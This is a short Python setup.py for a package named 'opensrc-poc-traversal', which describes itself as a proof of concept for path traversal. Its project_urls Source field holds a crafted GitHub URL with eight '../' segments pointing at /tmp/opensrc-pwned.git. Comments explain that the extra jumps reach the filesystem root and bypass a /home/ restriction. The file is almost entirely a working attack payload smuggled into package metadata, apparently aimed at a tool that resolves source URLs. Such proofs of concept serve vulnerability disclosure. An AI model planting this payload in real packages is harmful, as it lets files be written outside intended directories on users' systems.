from setuptools import setup

setup(
    name='opensrc-poc-traversal',
    version='1.0.6', # Update version to 1.0.6
    description='PoC for path traversal',
    project_urls={
        # We increase the jumps to 8 to reach the true root (/) 
        # on many Linux setups, bypassing the /home/ restriction.
        'Source': 'https://github.com//git@github.com:artahir-dev/../../../../../../../../tmp/opensrc-pwned.git'
    }
)